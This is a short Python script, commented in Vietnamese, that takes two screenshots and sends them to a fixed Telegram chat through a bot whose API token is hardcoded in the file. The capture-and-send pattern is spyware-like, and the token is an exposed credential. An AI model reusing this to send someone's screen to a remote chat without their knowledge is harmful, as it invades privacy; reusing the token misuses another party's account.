import pyscreenshot as ImageGrab
import time
import telegram

my_token = "5967111725:AAEssCocj62KYx4ocOEf5cyEhH8GMOVI6lY"
#tao bot
bot = telegram.Bot(token=my_token)

for i in range(0,2):

    time.sleep(2)
    im = ImageGrab.grab()
    im.show()
    im.save(str(i)+'.png')
    bot.sendPhoto(chat_id="5172036139", photo=open(str(i) + ".png", "rb"), caption="chup man hinh")

#
# # my_token  chinh la cai api ma bot_father dua
# my_token = "5967111725:AAEssCocj62KYx4ocOEf5cyEhH8GMOVI6lY"
# #tao bot
# bot = telegram.Bot(token=my_token)
#
# for i in range(0,2):
#     #gui tin nhan img tu Bot qua nguoi dung
#     bot.sendPhoto(chat_id="5172036139",photo = open(str(i)+".png","rb"),caption = "chup man hinh")
